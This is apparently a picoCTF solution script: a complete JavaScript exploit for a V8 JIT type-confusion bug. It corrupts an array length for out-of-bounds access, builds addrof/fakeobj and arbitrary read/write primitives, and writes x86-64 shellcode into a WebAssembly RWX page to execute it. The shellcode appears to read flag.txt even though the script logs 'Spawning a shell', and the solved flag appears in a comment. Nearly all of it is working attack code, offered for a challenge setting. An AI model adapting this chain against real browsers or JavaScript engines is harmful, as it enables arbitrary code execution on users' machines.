aux_obj = { "a": 1 }
aux_obj_arr = [aux_obj];



//578801101592338989 = 80850890 804222D Element pointer is leaked
//I can corrupt the z property behind!
obj = {a:aux_obj_arr};  //need to allocate 2 objects
obj = {a:aux_obj_arr};     
//dp(obj);
//x/20gx obj+3

//this array will be corrupted, giving it a very large length, allowing OOB read/write
aux_float_arr = [1.1, 2.2, 3.3];

//this array will be used to leak the float array map as well as the addrof and fakeobj primitive
fake_float_arr = [1.1, 2.2, 3.3];

//this two objects will be used to leak the obj array map as well as the addrof and fakeobj primitive
fake_obj = { "a": 1 };
fake_obj_arr = [fake_obj];

// /dp(aux_float_arr);

var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function dp(x){
    console.log('test');
    //%DebugPrint(x);
}



function ftoi(val, size) {
    f64_buf[0] = val;
    if (size == 32) {
        return BigInt(u64_buf[0]);
    } else if (size == 64) {
        return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
    }
}

function itof(val, size) {
    if (size == 32) {
        u64_buf[0] = Number(val & 0xffffffffn);
    } else if (size == 64) {
        u64_buf[0] = Number(val & 0xffffffffn);
        u64_buf[1] = Number(val >> 32n);
    }
    return f64_buf[0];
}

//this is the JIT vulnerability

f = function(a,val) { 
    a.z = val;
    return a.x 
}

//the number of property of this depends on the offset from the object to victim float array is
//function will be JITed. Compiler will think to always return the first value and always to set the last property(z) to the given value
//this setting of last property is used to overwrite the length of the victim array
var corruptObj = {x : 1.5, y:1.5, v:1.5, w:1.5, a:1.5, b:3, c:3, d:3, e:3, f:3, i:3, j:3, k:3, k:3, z: 3 };
for (let i = 0; i < 10000; i++){
    f(corruptObj,1);
}



var d = 1;
var d = 1;
var d = 1;
var d = 1;
var d = 1;
var a = 1;
var b = 1;
var c = 1; 


//%OptimizeFunctionOnNextCall(f);
function jitThis(){
    for (let i = 0; i < 10000; i++){
        f(corruptObj,1);
    }
}
jitThis();
jitThis();
jitThis();
jitThis();


//leak = f(obj,0x55)
console.log("[+] Trigger corruption!");

dp(obj);
//this will corrupt length to 0x55 * 2
var leak = f(obj,0x55);

//%DebugPrint(aux_float_arr) will return a larger length
//if here is not corrupted, adjust your offsets
dp(aux_float_arr);

//with this we will be able to OOB read/write
console.log("[+] Array length set to 0x1000")

//element pointer of fake_float_arr 
var elem_arr_ptr = ftoi(aux_float_arr[10], 32);

//float_arr_map
var flt_arr_map = ftoi(aux_float_arr[9], 32);
console.log("[+] fake_float_arr map: 0x" + flt_arr_map.toString(16));
console.log("[+] fake_float_arr element pointer: 0x" + elem_arr_ptr.toString(16));

//obj_arr_map
var fake_obj_arr_map = ftoi(aux_float_arr[14], 64);
fake_obj_arr_map = (fake_obj_arr_map & 0xffffffff00000000n)
fake_obj_arr_map = fake_obj_arr_map >> 32n
console.log("[+] fake_obj_arr_map map: 0x" + fake_obj_arr_map.toString(16));
//dp(fake_obj_arr)

//offset may differ, elem_obj_arr_ptr refers to the element pointer of the object array, this is at an offset away from the fake_float_arr element pointer
var elem_obj_arr_ptr = elem_arr_ptr + 0x40n
console.log("[+] fake_obj_arr element pointer = 0x" + elem_obj_arr_ptr.toString(16)) 
//dp(fake_float_arr)

//change the element pointer of fake_float_arr to that of the fake_obj_arr
//since the element pointer of object array is pointing to the obj
//now reading index 0 of fake_float_array will return address of obj
aux_float_arr[10]= itof((ftoi(aux_float_arr[10], 64) & 0xffffffff00000000n) + elem_obj_arr_ptr, 64);

function addrof(obj) { 

  //this overwrites the map of fake_float_arr to float array map
  aux_float_arr[9] = itof((ftoi(aux_float_arr[9], 64) & 0xffffffff00000000n) + flt_arr_map, 64); 

  //this changes the element pointer of fake_float_array to the object_array
  aux_float_arr[10]= itof((ftoi(aux_float_arr[10], 64) & 0xffffffff00000000n) + elem_obj_arr_ptr, 64);

  //place the object you are interested in at the fake_obj_arr which is now pointer by the fake_float_array
  fake_obj_arr[0] = obj; // Place the object at 0th index 

  //fake_float_arr pointer is pointing to the fake_obj_arr, instead of dereferencing the object, it will parse it like a float value
  return ftoi(fake_float_arr[0], 32) // Get the address of the object 
}

function fakeobj(addr) { 
  let fake; 

  //this restores the element pointer of fake_float_array back to its original 
  aux_float_arr[10]= itof((ftoi(aux_float_arr[10], 64) & 0xffffffff00000000n) + elem_arr_ptr, 64);

  //set the map of fake_float_arr back to float
  aux_float_arr[9] = itof((ftoi(aux_float_arr[9], 64) & 0xffffffff00000000n) + flt_arr_map, 64); 

  //put the addr at index 0, when changed into an obj_array map, it gives you a fake object at that address
  fake_float_arr[0] = itof(addr, 32); 

  //change the map of aux_arr to obj
  aux_float_arr[9] = itof((ftoi(aux_float_arr[9], 64) & 0xffffffff00000000n) + fake_obj_arr_map, 64); 


  fake = fake_float_arr[0];

  return fake; 
}

//with both primitives the rest will be easy

var rw_helper = [itof(flt_arr_map, 64), 1.1, 2.2, 3.3];
console.log("[+] rw_helper addr = " + addrof(rw_helper));
var rw_helper_addr = addrof(rw_helper) & 0xffffffffn;
console.log("[+] Controlled RW helper address: 0x" + rw_helper_addr.toString(16));
//dp(rw_helper);



function arb_read(addr) { 

  let fake = fakeobj(rw_helper_addr + 0x20n); 
  //console.log("test");

  //set index 1 to be the address we want to read
  //index 1 should be the element pointer because it is after the map
  rw_helper[1] = itof((0x8n << 32n) + addr - 0x8n, 64); 

  return ftoi(fake[0], 64); 
}

function arb_write(addr, value) { 
  let fake = fakeobj(rw_helper_addr + 0x20n); 
  rw_helper[1] = itof((0x8n << 32n) + addr - 0x8n, 64);
  fake[0] = itof(value, 64); 
}

var arr_buf = new ArrayBuffer(0x100); 
var dataview = new DataView(arr_buf); 
var arr_buf_addr = addrof(arr_buf) & 0xffffffffn;; 
console.log("[+] arr_buf_addr: 0x" + arr_buf_addr.toString(16));


var back_store_addr = arb_read(arr_buf_addr + 0x14n);
console.log("[+] Back store pointer: 0x" + back_store_addr.toString(16));

var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 0, 11]);
var wasm_module = new WebAssembly.Module(wasmCode);
var wasm_instance = new WebAssembly.Instance(wasm_module);
var pwn = wasm_instance.exports.main;


var wasm_instance_addr = addrof(wasm_instance) & 0xffffffffn;
console.log("[+] Wasm instance address: 0x" + addrof(wasm_instance).toString(16));
console.log("[+] Wasm instance address: 0x" + wasm_instance_addr.toString(16));

var rwx = arb_read(wasm_instance_addr + 0x68n);
console.log("[+] RWX section address: 0x" + rwx.toString(16));

arb_write(arr_buf_addr + 0x14n, rwx);

var shellcode = [0xe8,0x09,0x00,0x00,0x00,0x66,0x6c,0x61,0x67,0x2e,0x74,0x78,0x74,0x00,0x5f,0x48,0x31,0xc0,0x04,0x02,0x48,0x31,0xf6,0x0f,0x05,0x66,0x81,0xec,0xff,0x0f,0x48,0x8d,0x34,0x24,0x48,0x89,0xc7,0x48,0x31,0xd2,0x66,0xba,0xff,0x0f,0x48,0x31,0xc0,0x0f,0x05,0x48,0x31,0xff,0x40,0x80,0xc7,0x01,0x48,0x89,0xc2,0x48,0x31,0xc0,0x04,0x01,0x0f,0x05]
for (let i = 0; i < shellcode.length; i++) {
    dataview.setUint8(i, shellcode[i], true);
}
console.log("[+] Spawning a shell...");
pwn();

//picoCTF{Good_job!_Now_go_find_a_real_v8_cve!_85372322ef5a01aa}
/*
addrof is easy to test.
fakeobj should look something like this
d8> fakeobj(0x80872d1n)
[6.72263114e-316, 1.1, 2.2, 3.3]
first element is a map 81C39F1
*/

